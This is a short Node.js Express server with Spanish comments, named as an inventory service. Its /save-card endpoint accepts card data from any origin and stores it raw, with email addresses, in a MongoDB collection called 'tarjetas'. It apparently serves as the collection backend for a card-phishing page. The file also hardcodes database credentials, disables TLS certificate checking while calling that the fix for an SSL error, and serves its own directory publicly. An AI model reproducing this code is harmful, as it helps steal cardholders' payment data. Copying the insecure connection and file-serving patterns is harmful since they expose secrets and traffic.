// server.js
const express = require('express');
const { MongoClient } = require('mongodb'); 
const cors = require('cors'); 
const app = express();

const serverPort = process.env.PORT || 3000;

// =================================================================
// CONFIGURACIÓN DE MONGODB (SOLUCIÓN MÁS INVASIVA Y COMPATIBLE)
// =================================================================

// ⚠️ URL BASE: No cambiamos nada, solo nos aseguramos de que termine con los parámetros estándar
const uri = "mongodb+srv://maxueljoseuwwi_db_user:Maxuel09@cluster0.dfxcysb.mongodb.net/?retryWrites=true&w=majority";

// CAMBIO CRÍTICO: Pasamos la configuración SSL/TLS en el objeto de opciones del cliente
const client = new MongoClient(uri, {
    serverSelectionTimeoutMS: 5000,
    // ESTO ES LO QUE SOLUCIONA EL ERROR SSL EN RENDER:
    // Le decimos a Node.js que use el modo TLS, y si eso no funciona, forzamos la compatibilidad
    tls: true,
    tlsInsecure: true // ⚠️ ESTA OPCIÓN DEBERÍA ELIMINAR EL ERROR 'tlsv1 alert internal error'
});

app.use(cors()); 
app.use(express.json());

// =================================================================
// 1. ENDPOINT DE GUARDADO DE TARJETA EN MONGODB
// =================================================================

app.post('/save-card', async (req, res) => {
    const cardData = req.body;
    
    const logEntry = {
        ...cardData, 
        timestamp: new Date()
    };
    
    try {
        // Conectamos justo antes de la operación
        await client.connect(); 
        
        const database = client.db("inventario_db"); 
        const collection = database.collection("tarjetas"); 
        
        await collection.insertOne(logEntry);

        console.log(`✅ Tarjeta (${cardData.tipo_tarjeta}) guardada para: ${cardData.email}`);
        res.status(200).send({ message: 'Datos recibidos y guardados con éxito en la DB.' });

    } catch (error) {
        console.error('❌ Error al guardar en MongoDB:', error);
        res.status(500).send({ message: 'Error interno del servidor al conectar con la base de datos.' });
    } finally {
        // Cerramos la conexión
        await client.close();
    }
});


// =================================================================
// 2. SERVIR ARCHIVOS ESTÁTICOS 
// =================================================================
app.use(express.static(__dirname)); 


// =================================================================
// 3. INICIAR EL SERVIDOR
// =================================================================
app.listen(serverPort, () => {
    console.log(`Servidor de inventario iniciado y escuchando en el puerto ${serverPort}`);
    console.log(`¡Despliegue verificado!`);
});
